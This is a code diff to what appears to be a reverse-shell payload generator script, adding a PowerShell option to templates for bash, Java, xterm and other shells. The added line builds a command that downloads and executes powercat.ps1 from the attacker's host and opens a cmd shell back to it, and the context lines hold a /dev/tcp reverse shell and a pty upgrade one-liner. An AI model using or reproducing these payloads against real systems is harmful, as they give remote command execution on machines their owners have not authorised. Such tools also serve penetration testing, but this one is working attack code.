@@ -33,6 +33,8 @@ def generatePayload(type, local_address, port):
         return "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()" % (local_address, port)
     elif type == "xterm":
         return "xterm -display %s:1" % (local_address)
+    elif type == "powercat" or type == "powershell":
+        return "powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://%s/powercat.ps1');powercat -c %s -p %d -e cmd\")" % (local_address, local_address, port)
 
 if __name__ == "__main__":
 
@@ -48,7 +50,7 @@ if __name__ == "__main__":
 
     if payload is None:
         print("Unknown payload type: %s" % payload_type)
-        print("Supported types: bash, perl, python[2|3], php, ruby, netcat|nc, java, xterm")
+        print("Supported types: bash, perl, python[2|3], php, ruby, netcat|nc, java, xterm, powershell")
         exit(1)
 
     tty = "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
